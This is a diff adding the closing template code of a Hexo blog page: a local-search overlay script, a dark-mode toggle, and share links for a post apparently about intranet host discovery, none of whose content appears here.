+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-0x04%20%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0 + '&url=' + http%3A%2F%2Fysec.site%2F2024%2F12%2F04%2F0x04%2520%25E4%25B8%25BB%25E6%259C%25BA%25E5%258F%2591%25E7%258E%25B0%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://ysec.site/2024/12/04/0x04%20%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
